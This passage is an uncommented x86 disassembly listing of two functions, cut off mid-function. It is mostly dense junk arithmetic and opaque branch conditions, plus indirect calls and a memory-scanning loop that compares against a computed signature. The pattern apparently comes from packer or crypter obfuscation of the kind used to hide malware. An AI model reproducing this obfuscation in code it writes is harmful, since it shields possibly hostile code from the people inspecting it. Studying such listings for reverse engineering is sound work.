  419ef7:	jne    0x419f23
  419ef9:	mov    eax,DWORD PTR [ebp-0x20]
  419efc:	add    eax,ebx
  419efe:	mov    edi,0xd7
  419f03:	sub    edi,edx
  419f05:	sub    eax,edx
  419f07:	add    esi,eax
  419f09:	cmp    esi,0x3c
  419f0c:	je     0x419f23
  419f0e:	mov    ecx,0xc730
  419f13:	mov    edx,DWORD PTR [ebp-0x20]
  419f16:	xor    DWORD PTR [ebp-0x20],edi
  419f19:	add    edx,ecx
  419f1b:	add    esi,esi
  419f1d:	sub    DWORD PTR [ebp-0x20],edx
  419f20:	and    DWORD PTR [ebp-0x20],esi
  419f23:	mov    edx,DWORD PTR [ebp-0x18]
  419f26:	mov    esi,DWORD PTR [ebp-0x20]
  419f29:	test   ebx,0x7e
  419f2f:	je     0x419f3a
  419f31:	and    esi,ecx
  419f33:	cmp    esi,edi
  419f35:	je     0x419f3a
  419f37:	sub    DWORD PTR [ebp-0x20],esi
  419f3a:	call   edx
  419f3c:	add    DWORD PTR [ebp-0x20],eax
  419f3f:	mov    eax,DWORD PTR ds:0x459f04
  419f45:	sub    edi,eax
  419f47:	add    edi,edi
  419f49:	add    DWORD PTR [ebp-0x20],edi
  419f4c:	mov    eax,DWORD PTR [ebp-0x20]
  419f4f:	or     eax,edi
  419f51:	add    eax,esi
  419f53:	mov    esi,ebx
  419f55:	sub    DWORD PTR [ebp-0x20],esi
  419f58:	sub    DWORD PTR [ebp-0x20],eax
  419f5b:	and    edi,edx
  419f5d:	sub    edi,edx
  419f5f:	mov    esi,0xc9
  419f64:	mov    eax,DWORD PTR [ebp-0x20]
  419f67:	add    esi,edi
  419f69:	cmp    ebx,0x77
  419f6c:	je     0x419f86
  419f6e:	mov    edx,DWORD PTR [ebp-0x20]
  419f71:	mov    ebx,DWORD PTR [ebp-0x20]
  419f74:	add    DWORD PTR [ebp-0x20],esi
  419f77:	sub    ebx,edx
  419f79:	and    DWORD PTR [ebp-0x20],ebx
  419f7c:	test   eax,0x18
  419f81:	jne    0x419f86
  419f83:	or     DWORD PTR [ebp-0x20],eax
  419f86:	mov    esi,DWORD PTR [ebp-0x20]
  419f89:	test   edi,0x66
  419f8f:	je     0x419fc9
  419f91:	mov    eax,0x2a
  419f96:	mov    edx,DWORD PTR [ebp-0x20]
  419f99:	sub    eax,ebx
  419f9b:	xor    DWORD PTR [ebp-0x20],eax
  419f9e:	cmp    edx,0x800568
  419fa4:	je     0x419fc9
  419fa6:	cmp    edx,0x7b
  419fa9:	jne    0x419fc9
  419fab:	mov    edi,0xc04a6864
  419fb0:	add    edx,edi
  419fb2:	add    DWORD PTR [ebp-0x20],edi
  419fb5:	sub    DWORD PTR [ebp-0x20],esi
  419fb8:	sub    edx,esi
  419fba:	mov    ecx,0xe2
  419fbf:	add    ecx,eax
  419fc1:	add    DWORD PTR [ebp-0x20],ecx
  419fc4:	add    edx,edi
  419fc6:	sub    DWORD PTR [ebp-0x20],edx
  419fc9:	call   DWORD PTR ds:0x448f10
  419fcf:	mov    eax,DWORD PTR [ebp-0x20]
  419fd2:	cmp    eax,DWORD PTR ds:0x459ec4
  419fd8:	jne    0x41a002
  419fda:	cmp    eax,0xc
  419fdd:	je     0x41a002
  419fdf:	mov    edx,DWORD PTR [ebp-0x20]
  419fe2:	xor    DWORD PTR [ebp-0x20],ebx
  419fe5:	mov    ebx,DWORD PTR [ebp-0x20]
  419fe8:	cmp    edx,DWORD PTR [ebp-0xc]
  419feb:	je     0x41a002
  419fed:	cmp    edx,0xffffffef
  419ff0:	jne    0x41a002
  419ff2:	test   eax,0x43
  419ff7:	jne    0x41a002
  419ff9:	or     DWORD PTR [ebp-0x20],ebx
  419ffc:	add    DWORD PTR [ebp-0x20],eax
  419fff:	add    DWORD PTR [ebp-0x20],edx
  41a002:	add    DWORD PTR [ebp-0x20],edx
  41a005:	pop    edi
  41a006:	mov    eax,DWORD PTR [ebp-0x20]
  41a009:	mov    edx,DWORD PTR [ebp-0x20]
  41a00c:	cmp    edx,ebx
  41a00e:	je     0x41a025
  41a010:	and    eax,edi
  41a012:	add    DWORD PTR [ebp-0x20],eax
  41a015:	cmp    edx,esi
  41a017:	jne    0x41a025
  41a019:	mov    ecx,DWORD PTR ds:0x459ee4
  41a01f:	or     DWORD PTR [ebp-0x20],edx
  41a022:	add    DWORD PTR [ebp-0x20],ecx
  41a025:	pop    esi
  41a026:	mov    edx,DWORD PTR [ebp-0x20]
  41a029:	and    edx,ebx
  41a02b:	mov    eax,DWORD PTR [ebp-0x20]
  41a02e:	cmp    eax,0x19d2
  41a033:	je     0x41a0b1
  41a035:	cmp    edx,ecx
  41a037:	jne    0x41a0b1
  41a039:	cmp    edx,0x578d
  41a03f:	jne    0x41a0b1
  41a041:	mov    ecx,DWORD PTR [ebp-0x20]
  41a044:	cmp    eax,0x39
  41a047:	je     0x41a0b1
  41a049:	cmp    edx,DWORD PTR ds:0x459ec4
  41a04f:	jne    0x41a0b1
  41a051:	cmp    eax,DWORD PTR ds:0x459e78
  41a057:	je     0x41a0b1
  41a059:	add    ecx,eax
  41a05b:	cmp    ecx,edx
  41a05d:	je     0x41a0b1
  41a05f:	test   esi,0x16fd
  41a065:	je     0x41a0b1
  41a067:	mov    ebx,DWORD PTR [ebp-0x20]
  41a06a:	cmp    esi,edx
  41a06c:	je     0x41a0b1
  41a06e:	cmp    edx,0x5b
  41a071:	jne    0x41a0b1
  41a073:	mov    eax,DWORD PTR [ebp-0x20]
  41a076:	add    DWORD PTR [ebp-0x20],ebx
  41a079:	cmp    esi,DWORD PTR ds:0x459ee4
  41a07f:	jne    0x41a0b1
  41a081:	add    DWORD PTR [ebp-0x20],edx
  41a084:	xor    DWORD PTR [ebp-0x20],esi
  41a087:	mov    edx,DWORD PTR ds:0x459ea8
  41a08d:	mov    ebx,DWORD PTR [ebp-0x20]
  41a090:	sub    DWORD PTR [ebp-0x20],ebx
  41a093:	add    DWORD PTR [ebp-0x20],eax
  41a096:	add    DWORD PTR [ebp-0x20],ecx
  41a099:	mov    DWORD PTR [ebp-0x20],esi
  41a09c:	add    edx,ebx
  41a09e:	add    edx,ecx
  41a0a0:	cmp    edx,0x5e
  41a0a3:	jne    0x41a0b1
  41a0a5:	sub    edx,eax
  41a0a7:	sub    edx,eax
  41a0a9:	add    edx,eax
  41a0ab:	mov    DWORD PTR [ebp-0xd0],edx
  41a0b1:	pop    ebx
  41a0b2:	sub    DWORD PTR [ebp-0x20],ebx
  41a0b5:	leave  
  41a0b6:	ret    
  41a0b7:	int3   
  41a0b8:	int3   
  41a0b9:	int3   
  41a0ba:	int3   
  41a0bb:	int3   
  41a0bc:	push   ebp
  41a0bd:	mov    ebp,esp
  41a0bf:	sub    esp,0x48
  41a0c2:	mov    eax,0xf9
  41a0c7:	mov    edx,DWORD PTR ds:0x459e5c
  41a0cd:	mov    DWORD PTR [ebp-0x8],edx
  41a0d0:	sub    DWORD PTR [ebp-0x8],eax
  41a0d3:	push   ebx
  41a0d4:	mov    edx,0x86
  41a0d9:	sub    edx,eax
  41a0db:	sub    edx,eax
  41a0dd:	mov    ecx,0x27
  41a0e2:	add    ecx,eax
  41a0e4:	sub    edx,ecx
  41a0e6:	sub    DWORD PTR [ebp-0x8],edx
  41a0e9:	push   esi
  41a0ea:	mov    ebx,DWORD PTR [ebp-0x8]
  41a0ed:	mov    eax,0xea
  41a0f2:	cmp    ebx,0x55
  41a0f5:	je     0x41a175
  41a0f7:	mov    esi,DWORD PTR [ebp-0x8]
  41a0fa:	mov    edx,DWORD PTR [ebp-0x8]
  41a0fd:	test   ebx,0x6b69
  41a103:	je     0x41a175
  41a105:	mov    ecx,DWORD PTR [ebp-0x8]
  41a108:	or     esi,ebx
  41a10a:	test   esi,0xd6
  41a110:	jne    0x41a175
  41a112:	sub    ecx,esi
  41a114:	mov    esi,0x2e
  41a119:	or     esi,eax
  41a11b:	mov    eax,0x8d6d
  41a120:	cmp    ebx,ecx
  41a122:	jne    0x41a175
  41a124:	sub    edx,eax
  41a126:	sub    ecx,esi
  41a128:	xor    DWORD PTR [ebp-0x8],ecx
  41a12b:	cmp    edx,DWORD PTR [ebp-0x1c]
  41a12e:	jne    0x41a175
  41a130:	mov    ecx,ebx
  41a132:	mov    ebx,DWORD PTR [ebp-0x8]
  41a135:	sub    DWORD PTR [ebp-0x8],edx
  41a138:	cmp    ecx,DWORD PTR [ebp-0x28]
  41a13b:	je     0x41a175
  41a13d:	mov    esi,edx
  41a13f:	mov    eax,0xa8
  41a144:	or     eax,ecx
  41a146:	sub    eax,edx
  41a148:	test   esi,0xae
  41a14e:	je     0x41a175
  41a150:	sub    DWORD PTR [ebp-0x8],eax
  41a153:	add    DWORD PTR [ebp-0x8],ebx
  41a156:	cmp    esi,DWORD PTR ds:0x459f10
  41a15c:	jne    0x41a175
  41a15e:	mov    ecx,0xa3
  41a163:	sub    esi,eax
  41a165:	mov    edx,DWORD PTR [ebp-0x8]
  41a168:	sub    DWORD PTR [ebp-0x8],edx
  41a16b:	cmp    edx,esi
  41a16d:	jne    0x41a175
  41a16f:	sub    DWORD PTR [ebp-0x8],esi
  41a172:	or     DWORD PTR [ebp-0x8],ecx
  41a175:	push   edi
  41a176:	sub    DWORD PTR [ebp-0x8],ecx
  41a179:	mov    DWORD PTR [ebp-0x8],ebx
  41a17c:	mov    DWORD PTR [ebp-0x44],0x90833c1f
  41a183:	add    DWORD PTR [ebp-0x8],eax
  41a186:	call   0x41a7dc
  41a18b:	or     ebx,esi
  41a18d:	sub    ebx,esi
  41a18f:	mov    edx,DWORD PTR [ebp-0x8]
  41a192:	mov    DWORD PTR [ebp-0x8],ebx
  41a195:	mov    esi,0x461d
  41a19a:	sub    edx,esi
  41a19c:	cmp    edx,esi
  41a19e:	jne    0x41a1dd
  41a1a0:	mov    ecx,DWORD PTR [ebp-0x8]
  41a1a3:	mov    edi,DWORD PTR ds:0x459e5c
  41a1a9:	cmp    edx,DWORD PTR ds:0x459e5c
  41a1af:	jne    0x41a1dd
  41a1b1:	mov    ebx,DWORD PTR [ebp-0x8]
  41a1b4:	and    ebx,esi
  41a1b6:	sub    DWORD PTR [ebp-0x8],ecx
  41a1b9:	add    DWORD PTR [ebp-0x8],ebx
  41a1bc:	or     edi,esi
  41a1be:	add    DWORD PTR [ebp-0x8],edi
  41a1c1:	cmp    edx,eax
  41a1c3:	jne    0x41a1dd
  41a1c5:	mov    esi,DWORD PTR [ebp-0x8]
  41a1c8:	cmp    esi,DWORD PTR ds:0x459e5c
  41a1ce:	je     0x41a1dd
  41a1d0:	add    edx,eax
  41a1d2:	add    DWORD PTR [ebp-0x8],edx
  41a1d5:	cmp    esi,0xffffffcf
  41a1d8:	je     0x41a1dd
  41a1da:	sub    DWORD PTR [ebp-0x8],esi
  41a1dd:	mov    DWORD PTR [ebp-0x30],eax
  41a1e0:	add    edx,esi
  41a1e2:	mov    eax,0x3f19
  41a1e7:	mov    ecx,0x3c
  41a1ec:	cmp    ebx,0xffffffcd
  41a1ef:	je     0x41a22a
  41a1f1:	sub    DWORD PTR [ebp-0x8],ecx
  41a1f4:	add    eax,ecx
  41a1f6:	sub    DWORD PTR [ebp-0x8],eax
  41a1f9:	sub    edx,esi
  41a1fb:	mov    esi,edx
  41a1fd:	add    esi,edi
  41a1ff:	test   esi,0xbc
  41a205:	jne    0x41a22a
  41a207:	sub    DWORD PTR [ebp-0x8],edx
  41a20a:	mov    ecx,DWORD PTR [ebp-0x8]
  41a20d:	mov    edx,DWORD PTR ds:0x459f10
  41a213:	sub    DWORD PTR [ebp-0x8],edx
  41a216:	and    ecx,edx
  41a218:	add    esi,edi
  41a21a:	add    esi,eax
  41a21c:	sub    DWORD PTR [ebp-0x8],ecx
  41a21f:	test   esi,0xc7
  41a225:	jne    0x41a22a
  41a227:	add    DWORD PTR [ebp-0x8],esi
  41a22a:	call   0x41a7dc
  41a22f:	sub    esi,eax
  41a231:	mov    edi,DWORD PTR [ebp-0x8]
  41a234:	mov    edx,esi
  41a236:	sub    edi,esi
  41a238:	add    edi,eax
  41a23a:	and    DWORD PTR [ebp-0x8],esi
  41a23d:	sub    edi,eax
  41a23f:	add    edi,edi
  41a241:	add    edx,edx
  41a243:	cmp    edx,0xffffffcc
  41a246:	je     0x41a27c
  41a248:	and    edx,esi
  41a24a:	xor    DWORD PTR [ebp-0x8],edx
  41a24d:	cmp    edi,DWORD PTR [ebp-0x14]
  41a250:	je     0x41a27c
  41a252:	sub    edi,esi
  41a254:	sub    edi,ebx
  41a256:	sub    edi,ebx
  41a258:	add    edi,edi
  41a25a:	mov    ecx,0x78
  41a25f:	or     DWORD PTR [ebp-0x8],edi
  41a262:	add    DWORD PTR [ebp-0x8],edx
  41a265:	mov    esi,0xe2
  41a26a:	add    DWORD PTR [ebp-0x8],esi
  41a26d:	and    ecx,ebx
  41a26f:	and    ecx,edi
  41a271:	cmp    ecx,DWORD PTR ds:0x459f10
  41a277:	je     0x41a27c
  41a279:	add    DWORD PTR [ebp-0x8],ecx
  41a27c:	cmp    eax,DWORD PTR [ebp-0x30]
  41a27f:	je     0x41a591
  41a285:	sub    DWORD PTR [ebp-0x8],esi
  41a288:	call   0x41a7dc
  41a28d:	mov    edi,DWORD PTR [ebp-0x8]
  41a290:	mov    edx,0x1b
  41a295:	cmp    edi,DWORD PTR ds:0x459e5c
  41a29b:	je     0x41a2fc
  41a29d:	mov    esi,DWORD PTR [ebp-0x8]
  41a2a0:	add    edi,esi
  41a2a2:	add    edi,ebx
  41a2a4:	mov    ebx,DWORD PTR ds:0x459e5c
  41a2aa:	cmp    eax,0x5b
  41a2ad:	je     0x41a2fc
  41a2af:	mov    edx,0xa6
  41a2b4:	add    DWORD PTR [ebp-0x8],edx
  41a2b7:	cmp    esi,0x19
  41a2ba:	je     0x41a2fc
  41a2bc:	sub    edi,eax
  41a2be:	mov    ecx,DWORD PTR [ebp-0x8]
  41a2c1:	mov    ebx,DWORD PTR ds:0x459f10
  41a2c7:	sub    DWORD PTR [ebp-0x8],edi
  41a2ca:	cmp    ecx,0x3d8d
  41a2d0:	jne    0x41a2fc
  41a2d2:	add    DWORD PTR [ebp-0x8],ebx
  41a2d5:	cmp    ecx,DWORD PTR [ebp-0x3c]
  41a2d8:	jne    0x41a2fc
  41a2da:	mov    esi,DWORD PTR [ebp-0x8]
  41a2dd:	mov    edx,DWORD PTR [ebp-0x8]
  41a2e0:	sub    esi,edi
  41a2e2:	cmp    ecx,DWORD PTR ds:0x459e5c
  41a2e8:	jne    0x41a2fc
  41a2ea:	or     ecx,edx
  41a2ec:	mov    edi,0x43e0
  41a2f1:	add    DWORD PTR [ebp-0x8],esi
  41a2f4:	and    DWORD PTR [ebp-0x8],ecx
  41a2f7:	add    edi,eax
  41a2f9:	or     DWORD PTR [ebp-0x8],edi
  41a2fc:	cmp    eax,DWORD PTR [ebp-0x30]
  41a2ff:	je     0x41a591
  41a305:	cmp    eax,ecx
  41a307:	je     0x41a34b
  41a309:	mov    edi,DWORD PTR [ebp-0x8]
  41a30c:	test   edi,0x42
  41a312:	je     0x41a34b
  41a314:	mov    eax,DWORD PTR ds:0x459f10
  41a31a:	mov    esi,edx
  41a31c:	or     edi,edx
  41a31e:	cmp    esi,0xffffff8c
  41a321:	jne    0x41a34b
  41a323:	add    DWORD PTR [ebp-0x8],ebx
  41a326:	mov    ebx,0xf1
  41a32b:	add    edi,esi
  41a32d:	cmp    edi,DWORD PTR ds:0x459e5c
  41a333:	je     0x41a34b
  41a335:	add    eax,edi
  41a337:	cmp    eax,edi
  41a339:	jne    0x41a34b
  41a33b:	mov    edx,DWORD PTR [ebp-0x8]
  41a33e:	cmp    edi,0x33
  41a341:	jne    0x41a34b
  41a343:	sub    eax,edx
  41a345:	add    DWORD PTR [ebp-0x8],ebx
  41a348:	sub    DWORD PTR [ebp-0x8],eax
  41a34b:	add    DWORD PTR [ebp-0x44],0x525f3ec5
  41a352:	mov    ebx,0xb6
  41a357:	cmp    eax,0x29
  41a35a:	jne    0x41a37b
  41a35c:	mov    ecx,DWORD PTR [ebp-0x8]
  41a35f:	cmp    edi,0x4b
  41a362:	je     0x41a37b
  41a364:	add    ecx,ebx
  41a366:	test   ecx,0x906a
  41a36c:	jne    0x41a37b
  41a36e:	cmp    ecx,DWORD PTR [ebp-0x18]
  41a371:	je     0x41a37b
  41a373:	mov    edi,DWORD PTR [ebp-0x8]
  41a376:	add    ecx,edi
  41a378:	add    DWORD PTR [ebp-0x8],ecx
  41a37b:	push   0x459f10
  41a380:	call   DWORD PTR ds:0x45a56c
  41a386:	add    esi,edi
  41a388:	mov    ecx,DWORD PTR [ebp-0x8]
  41a38b:	test   esi,0xa944
  41a391:	je     0x41a438
  41a397:	sub    ecx,eax
  41a399:	cmp    ecx,eax
  41a39b:	je     0x41a438
  41a3a1:	add    ecx,edi
  41a3a3:	mov    edx,DWORD PTR [ebp-0x8]
  41a3a6:	cmp    edx,eax
  41a3a8:	jne    0x41a438
  41a3ae:	mov    ebx,DWORD PTR [ebp-0x8]
  41a3b1:	cmp    ebx,0xb245794
  41a3b7:	je     0x41a438
  41a3b9:	sub    ecx,edx
  41a3bb:	mov    edi,0x6404
  41a3c0:	add    ebx,ebx
  41a3c2:	cmp    eax,0xa970
  41a3c7:	je     0x41a438
  41a3c9:	sub    ebx,edi
  41a3cb:	mov    edi,DWORD PTR ds:0x459e5c
  41a3d1:	mov    edx,0x72
  41a3d6:	sub    edx,edi
  41a3d8:	add    esi,ebx
  41a3da:	sub    DWORD PTR [ebp-0x8],edx
  41a3dd:	cmp    esi,0xffffff84
  41a3e0:	je     0x41a438
  41a3e2:	mov    edi,DWORD PTR [ebp-0x8]
  41a3e5:	mov    edx,DWORD PTR [ebp-0x8]
  41a3e8:	add    DWORD PTR [ebp-0x8],edx
  41a3eb:	test   edi,0x72
  41a3f1:	jne    0x41a438
  41a3f3:	mov    edx,DWORD PTR ds:0x459e5c
  41a3f9:	cmp    esi,DWORD PTR ds:0x459e5c
  41a3ff:	je     0x41a438
  41a401:	and    DWORD PTR [ebp-0x8],ecx
  41a404:	add    DWORD PTR [ebp-0x8],edi
  41a407:	cmp    ecx,0x341a
  41a40d:	je     0x41a438
  41a40f:	sub    DWORD PTR [ebp-0x8],esi
  41a412:	mov    ebx,DWORD PTR [ebp-0x8]
  41a415:	cmp    ebx,DWORD PTR ds:0x459e5c
  41a41b:	je     0x41a438
  41a41d:	add    ebx,edx
  41a41f:	mov    esi,0xca
  41a424:	mov    ecx,0x6e90
  41a429:	and    ecx,edx
  41a42b:	sub    esi,edi
  41a42d:	sub    DWORD PTR [ebp-0x8],ebx
  41a430:	sub    esi,ebx
  41a432:	and    DWORD PTR [ebp-0x8],esi
  41a435:	add    DWORD PTR [ebp-0x8],ecx
  41a438:	or     eax,eax
  41a43a:	je     0x41a591
  41a440:	test   eax,0x3
  41a445:	je     0x41a481
  41a447:	sub    edi,eax
  41a449:	sub    edi,ecx
  41a44b:	mov    ecx,esi
  41a44d:	mov    edx,DWORD PTR [ebp-0x8]
  41a450:	add    ecx,edi
  41a452:	cmp    ecx,DWORD PTR [ebp-0x14]
  41a455:	jne    0x41a481
  41a457:	sub    edx,ebx
  41a459:	and    DWORD PTR [ebp-0x8],edx
  41a45c:	mov    esi,ebx
  41a45e:	sub    esi,edx
  41a460:	mov    edi,DWORD PTR [ebp-0x8]
  41a463:	sub    DWORD PTR [ebp-0x8],ebx
  41a466:	cmp    esi,DWORD PTR ds:0x459f10
  41a46c:	je     0x41a481
  41a46e:	test   esi,0x7687
  41a474:	jne    0x41a481
  41a476:	sub    DWORD PTR [ebp-0x8],edi
  41a479:	sub    ecx,edi
  41a47b:	mov    DWORD PTR [ebp-0x8],ecx
  41a47e:	sub    DWORD PTR [ebp-0x8],esi
  41a481:	add    DWORD PTR [ebp-0x44],0x8bc11b2
  41a488:	cmp    ebx,edx
  41a48a:	jne    0x41a49b
  41a48c:	mov    ebx,0x8b9
  41a491:	sub    ebx,edx
  41a493:	cmp    ebx,0xffffffa1
  41a496:	jne    0x41a49b
  41a498:	or     DWORD PTR [ebp-0x8],ebx
  41a49b:	lea    ecx,[eax+0xcdc]
  41a4a1:	and    edi,ebx
  41a4a3:	cmp    edi,0x1f
  41a4a6:	je     0x41a505
  41a4a8:	cmp    edi,0x74
  41a4ab:	je     0x41a505
  41a4ad:	add    edi,edi
  41a4af:	sub    DWORD PTR [ebp-0x8],esi
  41a4b2:	cmp    ecx,0xffffff8c
  41a4b5:	je     0x41a505
  41a4b7:	and    DWORD PTR [ebp-0x8],esi
  41a4ba:	mov    edx,0xa4
  41a4bf:	mov    ebx,DWORD PTR [ebp-0x8]
  41a4c2:	sub    DWORD PTR [ebp-0x8],edi
  41a4c5:	cmp    ecx,DWORD PTR ds:0x459f10
  41a4cb:	jne    0x41a505
  41a4cd:	mov    eax,DWORD PTR [ebp-0x8]
  41a4d0:	sub    edx,ecx
  41a4d2:	cmp    eax,0x63
  41a4d5:	jne    0x41a505
  41a4d7:	test   ebx,0x70
  41a4dd:	je     0x41a505
  41a4df:	cmp    ebx,eax
  41a4e1:	jne    0x41a505
  41a4e3:	mov    edi,DWORD PTR [ebp-0x8]
  41a4e6:	cmp    ebx,edx
  41a4e8:	je     0x41a505
  41a4ea:	mov    esi,0x5
  41a4ef:	mov    DWORD PTR [ebp-0x8],ebx
  41a4f2:	or     DWORD PTR [ebp-0x8],edi
  41a4f5:	add    DWORD PTR [ebp-0x8],edx
  41a4f8:	or     esi,edx
  41a4fa:	or     DWORD PTR [ebp-0x8],esi
  41a4fd:	sub    eax,edi
  41a4ff:	and    DWORD PTR [ebp-0x8],edi
  41a502:	add    DWORD PTR [ebp-0x8],eax
  41a505:	inc    ecx
  41a506:	add    edx,esi
  41a508:	cmp    edi,0x42
  41a50b:	je     0x41a535
  41a50d:	and    edx,eax
  41a50f:	mov    edi,DWORD PTR [ebp-0x8]
  41a512:	mov    DWORD PTR [ebp-0x8],edx
  41a515:	mov    edx,DWORD PTR [ebp-0x8]
  41a518:	sub    edx,eax
  41a51a:	sub    DWORD PTR [ebp-0x8],edx
  41a51d:	and    edi,esi
  41a51f:	sub    edi,edx
  41a521:	test   edi,0x3518848
  41a527:	je     0x41a535
  41a529:	mov    edx,ecx
  41a52b:	sub    edi,esi
  41a52d:	and    edi,edx
  41a52f:	mov    DWORD PTR [ebp-0x38],ecx
  41a532:	add    DWORD PTR [ebp-0x38],edi
  41a535:	mov    edi,DWORD PTR [ecx]
  41a537:	sub    edi,0xc02274c5
  41a53d:	cmp    edi,0x3fdcb7f0
  41a543:	jne    0x41a4a1
  41a549:	mov    edi,DWORD PTR ds:0x459e7c
  41a54f:	mov    edx,DWORD PTR [ebp-0x8]
  41a552:	sub    DWORD PTR [ebp-0x8],edi
  41a555:	cmp    edx,DWORD PTR [ebp-0x28]
  41a558:	jne    0x41a582
  41a55a:	cmp    eax,DWORD PTR [ebp-0x10]
  41a55d:	jne    0x41a582
  41a55f:	mov    esi,DWORD PTR ds:0x459e7c
  41a565:	cmp    eax,edx
  41a567:	je     0x41a582
  41a569:	mov    edi,DWORD PTR [ebp-0x8]
  41a56c:	mov    eax,0x28
  41a571:	sub    eax,esi
  41a573:	sub    edi,ecx
  41a575:	or     edx,ebx
  41a577:	sub    DWORD PTR [ebp-0x8],edi
  41a57a:	add    DWORD PTR [ebp-0x8],eax
  41a57d:	sub    edx,esi
  41a57f:	and    DWORD PTR [ebp-0x8],edx
  41a582:	mov    edi,DWORD PTR [ecx+0x4]
  41a585:	mov    eax,ebx
  41a587:	sub    eax,edx
  41a589:	sub    eax,ecx
  41a58b:	xor    DWORD PTR [ebp-0x8],eax
  41a58e:	sub    DWORD PTR [ebp-0x44],edi
  41a591:	add    eax,eax
  41a593:	sub    eax,edx
  41a595:	mov    ecx,esi
  41a597:	mov    esi,DWORD PTR [ebp-0x8]
  41a59a:	sub    DWORD PTR [ebp-0x8],esi
  41a59d:	sub    eax,ebx
  41a59f:	sub    ecx,edx
  41a5a1:	and    ecx,ebx
  41a5a3:	sub    ecx,eax
  41a5a5:	cmp    edi,eax
  41a5a7:	je     0x41a620
  41a5a9:	and    ecx,ebx
  41a5ab:	or     ecx,ebx
  41a5ad:	and    ecx,esi
  41a5af:	and    ecx,edi
  41a5b1:	mov    esi,0x64
  41a5b6:	cmp    eax,DWORD PTR [ebp-0x2c]
  41a5b9:	jne    0x41a620
  41a5bb:	add    DWORD PTR [ebp-0x8],ecx
  41a5be:	mov    ecx,DWORD PTR [ebp-0x8]
  41a5c1:	add    DWORD PTR [ebp-0x8],esi
  41a5c4:	sub    ecx,ebx
  41a5c6:	mov    edi,ecx
  41a5c8:	cmp    edi,0xff0c
  41a5ce:	jne    0x41a620
  41a5d0:	mov    eax,DWORD PTR ds:0x459ebc
  41a5d6:	sub    DWORD PTR [ebp-0x8],edi
  41a5d9:	add    eax,eax
  41a5db:	mov    edx,DWORD PTR [ebp-0x8]
  41a5de:	add    edx,ebx
  41a5e0:	sub    eax,edi
  41a5e2:	cmp    edx,DWORD PTR ds:0x459e5c
  41a5e8:	je     0x41a620
  41a5ea:	sub    edx,edi
  41a5ec:	mov    ebx,DWORD PTR [ebp-0x8]
  41a5ef:	sub    DWORD PTR [ebp-0x8],ebx
  41a5f2:	mov    ebx,0xe2
  41a5f7:	sub    DWORD PTR [ebp-0x8],ebx
  41a5fa:	cmp    ecx,0x30
  41a5fd:	jne    0x41a620
  41a5ff:	mov    esi,DWORD PTR [ebp-0x8]
  41a602:	mov    ecx,DWORD PTR ds:0x459e7c
  41a608:	sub    DWORD PTR [ebp-0x8],eax
  41a60b:	sub    DWORD PTR [ebp-0x8],eax
  41a60e:	mov    DWORD PTR [ebp-0x20],edx
  41a611:	or     DWORD PTR [ebp-0x8],esi
  41a614:	add    eax,edi
  41a616:	sub    ecx,esi
  41a618:	sub    DWORD PTR [ebp-0x8],eax
  41a61b:	add    ecx,edi
  41a61d:	sub    DWORD PTR [ebp-0x20],ecx
  41a620:	add    DWORD PTR [ebp-0x8],edx
  41a623:	mov    edx,DWORD PTR [ebp+0xc]
  41a626:	and    DWORD PTR [ebp-0x8],ebx
  41a629:	mov    edi,DWORD PTR [ebp-0x44]
  41a62c:	mov    esi,DWORD PTR [ebp-0x8]
  41a62f:	add    DWORD PTR [ebp-0x8],edi
  41a632:	mov    DWORD PTR [ebp-0x48],esi
  41a635:	mov    DWORD PTR [edx+0x0],edi
  41a638:	mov    DWORD PTR [ebp-0xc],ecx
  41a63b:	mov    edi,DWORD PTR [ebp-0x48]
  41a63e:	add    DWORD PTR [ebp-0x8],edi
  41a641:	pop    edi
  41a642:	cmp    edi,0xfffffff5
  41a645:	je     0x41a64f
  41a647:	mov    eax,0xb7
  41a64c:	or     DWORD PTR [ebp-0x48],eax
  41a64f:	pop    esi
  41a650:	add    edx,eax
  41a652:	mov    eax,0x1c18
  41a657:	add    eax,esi
  41a659:	sub    DWORD PTR [ebp-0x8],eax
  41a65c:	add    edx,ebx
  41a65e:	add    edx,ecx
  41a660:	cmp    edx,DWORD PTR [ebp-0x48]
  41a663:	je     0x41a774
  41a669:	mov    ecx,0x50
  41a66e:	or     DWORD PTR [ebp-0xc],edx
  41a671:	add    ecx,ecx
  41a673:	mov    edx,DWORD PTR [ebp-0x48]
  41a676:	cmp    edx,0x7f
  41a679:	je     0x41a774
  41a67f:	cmp    edx,0xffffff91
  41a682:	jne    0x41a774
  41a688:	and    ecx,esi
  41a68a:	sub    edx,ebx
  41a68c:	cmp    ecx,edx
  41a68e:	jne    0x41a774
  41a694:	sub    DWORD PTR [ebp-0x48],edx
  41a697:	mov    eax,DWORD PTR [ebp-0x8]
  41a69a:	mov    edx,DWORD PTR [ebp-0x48]
  41a69d:	add    ecx,edx
  41a69f:	add    DWORD PTR [ebp-0x8],ecx
  41a6a2:	cmp    eax,0xffffffde
  41a6a5:	je     0x41a774
  41a6ab:	mov    edx,DWORD PTR [ebp-0x8]
  41a6ae:	cmp    edx,ecx
  41a6b0:	jne    0x41a774
  41a6b6:	mov    ebx,DWORD PTR [ebp-0x48]
  41a6b9:	and    DWORD PTR [ebp-0x48],ecx
  41a6bc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a6bf:	cmp    ebx,0x1
  41a6c2:	jne    0x41a774
  41a6c8:	cmp    ecx,0xf627
  41a6ce:	jne    0x41a774
  41a6d4:	add    ebx,esi
  41a6d6:	sub    eax,edi
  41a6d8:	and    ebx,ecx
  41a6da:	cmp    esi,ecx
  41a6dc:	je     0x41a774
  41a6e2:	cmp    eax,esi
  41a6e4:	jne    0x41a774
  41a6ea:	sub    edx,ebx
  41a6ec:	mov    ebx,0x5692
  41a6f1:	add    ebx,eax
  41a6f3:	test   ebx,0x6b
  41a6f9:	je     0x41a774
  41a6fb:	and    edx,ecx
  41a6fd:	mov    eax,DWORD PTR [ebp-0xc]
  41a700:	test   edx,0x9d
  41a706:	je     0x41a774
  41a708:	cmp    ecx,DWORD PTR ds:0x459e7c
  41a70e:	je     0x41a774
  41a710:	mov    ecx,0x81
  41a715:	sub    ecx,edx
  41a717:	mov    edx,DWORD PTR [ebp-0x8]
  41a71a:	cmp    ecx,DWORD PTR ds:0x459ebc
  41a720:	je     0x41a774
  41a722:	xor    DWORD PTR [ebp-0xc],ebx
  41a725:	add    edx,edx
  41a727:	mov    ebx,DWORD PTR [ebp-0xc]
  41a72a:	or     DWORD PTR [ebp-0x48],ecx
  41a72d:	sub    DWORD PTR [ebp-0x8],edi
  41a730:	mov    ecx,edx
  41a732:	test   edi,0xfe
  41a738:	jne    0x41a774
  41a73a:	mov    edx,0xd5
  41a73f:	add    ebx,esi
  41a741:	cmp    ecx,ebx
